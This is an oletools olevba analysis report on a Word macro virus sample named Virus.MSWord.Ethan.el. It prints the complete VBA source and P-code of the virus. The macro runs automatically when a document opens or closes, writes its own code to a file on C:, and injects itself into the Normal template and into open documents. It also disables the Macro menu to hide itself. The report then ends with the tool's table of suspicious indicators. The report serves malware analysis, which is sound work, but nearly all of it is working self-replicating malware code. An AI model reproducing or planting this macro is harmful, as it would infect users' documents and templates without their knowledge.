olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.el
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO veremos.cls 
in file: Virus.MSWord.Ethan.el - OLE stream: 'Macros/VBA/veremos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'GRADE SETEMBRO 2001.doc
Private Sub infestor(obj As Object)
'PAnual.doc
   On Error Resume Next
'hospedaje.doc
   Dim lincod As String
'social 11.doc
   For m = 1 To obj.CodeModule.countoflines
      obj.CodeModule.DeleteLines 1, 1
   Next m
   obj.Name = "veremos"
      Open "C:\Gibtesnicht.sys" For Input As #1
       m = 1
       Do While Not EOF(1)
         Line Input #1, lincod
         obj.CodeModule.insertlines m, lincod
         m = m + 1
       Loop
      Close #1
End Sub
Private Sub copiar(Fuente As Object)
  On Error Resume Next
  If Dir("C:\Gibtesnicht.sys") <> "C:\Gibtesnicht.sys" Then
  Open "C:\Gibtesnicht.sys" For Output As #1
    For i = 1 To Fuente.CodeModule.countoflines
     s = Fuente.CodeModule.lines(i, 1)
'Documento1
'Documento1
     Print #1, s
    Next i
  Close #1
  End If
End Sub
'Doc1.doc
Private Sub document_close()
'Doc1.doc
  On Error Resume Next
  ocultar
'social 11.doc
  Dim op
  op = System.PrivateProfileString("", "HKEY_CURRENT_USER", "Tiempo")
'hospedaje.doc
'social 11.doc
  If Len(op) <> 0 Then
  If CByte(op) = 60 Then
'hospedaje.doc
   MsgBox "Mire los facil que es estar infestado por un virus macro" _
    & ". Este es una tonteria que no causa daño pero podira facilmente" _
    & " eliminar el contenido de su computadora"
  Else
   System.PrivateProfileString("", "HKEY_CURRENT_USER\", "Tiempo") = CStr(op + 1)
  End If
  Else
'Documento1
  System.PrivateProfileString("", "HKEY_CURRENT_USER\", "Tiempo") = 0
  End If
  Dim h As Integer
'Documento1
  Dim nor As Object, doc As Object, f As Object
  Set doc = ActiveDocument.VBProject.VBComponents.Item(1)
  Set nor = NormalTemplate.VBProject.VBComponents.Item(1)
  If Application.MacroContainer = ActiveDocument.Name Then
   If nor.Name <> "veremos" Then
'Doc1.doc
      Call copiar(doc)
      Call infestor(nor)
      NormalTemplate.Save
   End If
'Documento1
'Doc1.doc
  Else
     If doc.Name <> "veremos" Then
      Call copiar(nor)
      Call infestor(doc)
      ActiveDocument.Save
      miautor = ActiveDocument.Name
'PAnual.doc
      Dim i As Byte
      For i = 1 To 5
       h = Int((doc.CodeModule.countoflines * Rnd) + 1)
'PAnual.doc
'social 11.doc
'PAnual.doc
'GRADE SETEMBRO 2001.doc
'Doc1.doc
       doc.CodeModule.insertlines h, "'" + miautor
      Next i
     End If
'PAnual.doc
'GRADE SETEMBRO 2001.doc
  End If
'GRADE SETEMBRO 2001.doc
'hospedaje.doc
End Sub
Private Sub document_open()
'social 11.doc
'GRADE SETEMBRO 2001.doc
 document_close
End Sub
Private Sub ocultar()
'hospedaje.doc
 On Error Resume Next
 Application.CommandBars("Tools").Controls("Macro").Enabled = False
 Application.CommandBars("Tools").Controls("Macro").Enabled = False
End Sub
















-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.el
' ===============================================================================
' Module streams:
' Macros/VBA/veremos - 6657 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0017 "GRADE SETEMBRO 2001.doc"
' Line #2:
' 	FuncDefn (Private Sub infestor(obj As Object))
' Line #3:
' 	QuoteRem 0x0000 0x000A "PAnual.doc"
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	QuoteRem 0x0000 0x000D "hospedaje.doc"
' Line #6:
' 	Dim 
' 	VarDefn lincod (As String)
' Line #7:
' 	QuoteRem 0x0000 0x000D "social 11.doc"
' Line #8:
' 	StartForVariable 
' 	Ld m 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld obj 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	For 
' Line #9:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld obj 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #10:
' 	StartForVariable 
' 	Ld m 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	LitStr 0x0007 "veremos"
' 	Ld obj 
' 	MemSt New 
' Line #12:
' 	LitStr 0x0012 "C:\Gibtesnicht.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #13:
' 	LitDI2 0x0001 
' 	St m 
' Line #14:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld lincod 
' 	LineInput 
' Line #16:
' 	Ld m 
' 	Ld lincod 
' 	Ld obj 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #17:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' Line #18:
' 	Loop 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Private Sub copiar(Fuente As Object))
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	LitStr 0x0012 "C:\Gibtesnicht.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0012 "C:\Gibtesnicht.sys"
' 	Ne 
' 	IfBlock 
' Line #24:
' 	LitStr 0x0012 "C:\Gibtesnicht.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Fuente 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	For 
' Line #26:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Fuente 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St s 
' Line #27:
' 	QuoteRem 0x0000 0x000A "Documento1"
' Line #28:
' 	QuoteRem 0x0000 0x000A "Documento1"
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld s 
' 	PrintItemNL 
' Line #30:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	EndSub 
' Line #34:
' 	QuoteRem 0x0000 0x0008 "Doc1.doc"
' Line #35:
' 	FuncDefn (Private Sub document_close())
' Line #36:
' 	QuoteRem 0x0000 0x0008 "Doc1.doc"
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall ocultar 0x0000 
' Line #39:
' 	QuoteRem 0x0000 0x000D "social 11.doc"
' Line #40:
' 	Dim 
' 	VarDefn op
' Line #41:
' 	LitStr 0x0000 ""
' 	LitStr 0x0011 "HKEY_CURRENT_USER"
' 	LitStr 0x0006 "Tiempo"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St op 
' Line #42:
' 	QuoteRem 0x0000 0x000D "hospedaje.doc"
' Line #43:
' 	QuoteRem 0x0000 0x000D "social 11.doc"
' Line #44:
' 	Ld op 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #45:
' 	Ld op 
' 	Coerce (Byte) 
' 	LitDI2 0x003C 
' 	Eq 
' 	IfBlock 
' Line #46:
' 	QuoteRem 0x0000 0x000D "hospedaje.doc"
' Line #47:
' 	LineCont 0x0008 02 00 04 00 04 00 04 00
' 	LitStr 0x0038 "Mire los facil que es estar infestado por un virus macro"
' 	LitStr 0x003F ". Este es una tonteria que no causa daño pero podira facilmente"
' 	Concat 
' 	LitStr 0x0028 " eliminar el contenido de su computadora"
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #48:
' 	ElseBlock 
' Line #49:
' 	Ld op 
' 	LitDI2 0x0001 
' 	Add 
' 	Coerce (Str) 
' 	LitStr 0x0000 ""
' 	LitStr 0x0012 "HKEY_CURRENT_USER\"
' 	LitStr 0x0006 "Tiempo"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	ElseBlock 
' Line #52:
' 	QuoteRem 0x0000 0x000A "Documento1"
' Line #53:
' 	LitDI2 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x0012 "HKEY_CURRENT_USER\"
' 	LitStr 0x0006 "Tiempo"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Dim 
' 	VarDefn h (As Integer)
' Line #56:
' 	QuoteRem 0x0000 0x000A "Documento1"
' Line #57:
' 	Dim 
' 	VarDefn nor (As Object)
' 	VarDefn doc (As Object)
' 	VarDefn False (As Object)
' Line #58:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set doc 
' Line #59:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nor 
' Line #60:
' 	Ld Application 
' 	MemLd MacroContainer 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	Ld nor 
' 	MemLd New 
' 	LitStr 0x0007 "veremos"
' 	Ne 
' 	IfBlock 
' Line #62:
' 	QuoteRem 0x0000 0x0008 "Doc1.doc"
' Line #63:
' 	Ld doc 
' 	ArgsCall (Call) copiar 0x0001 
' Line #64:
' 	Ld nor 
' 	ArgsCall (Call) infestor 0x0001 
' Line #65:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	QuoteRem 0x0000 0x000A "Documento1"
' Line #68:
' 	QuoteRem 0x0000 0x0008 "Doc1.doc"
' Line #69:
' 	ElseBlock 
' Line #70:
' 	Ld doc 
' 	MemLd New 
' 	LitStr 0x0007 "veremos"
' 	Ne 
' 	IfBlock 
' Line #71:
' 	Ld nor 
' 	ArgsCall (Call) copiar 0x0001 
' Line #72:
' 	Ld doc 
' 	ArgsCall (Call) infestor 0x0001 
' Line #73:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #74:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St miautor 
' Line #75:
' 	QuoteRem 0x0000 0x000A "PAnual.doc"
' Line #76:
' 	Dim 
' 	VarDefn i (As Byte)
' Line #77:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' Line #78:
' 	Ld doc 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St h 
' Line #79:
' 	QuoteRem 0x0000 0x000A "PAnual.doc"
' Line #80:
' 	QuoteRem 0x0000 0x000D "social 11.doc"
' Line #81:
' 	QuoteRem 0x0000 0x000A "PAnual.doc"
' Line #82:
' 	QuoteRem 0x0000 0x0017 "GRADE SETEMBRO 2001.doc"
' Line #83:
' 	QuoteRem 0x0000 0x0008 "Doc1.doc"
' Line #84:
' 	Ld h 
' 	LitStr 0x0001 "'"
' 	Ld miautor 
' 	Add 
' 	Ld doc 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	QuoteRem 0x0000 0x000A "PAnual.doc"
' Line #88:
' 	QuoteRem 0x0000 0x0017 "GRADE SETEMBRO 2001.doc"
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	QuoteRem 0x0000 0x0017 "GRADE SETEMBRO 2001.doc"
' Line #91:
' 	QuoteRem 0x0000 0x000D "hospedaje.doc"
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Private Sub document_open())
' Line #94:
' 	QuoteRem 0x0000 0x000D "social 11.doc"
' Line #95:
' 	QuoteRem 0x0000 0x0017 "GRADE SETEMBRO 2001.doc"
' Line #96:
' 	ArgsCall document_close 0x0000 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Private Sub ocultar())
' Line #99:
' 	QuoteRem 0x0000 0x000D "hospedaje.doc"
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #102:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #103:
' 	EndSub 
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

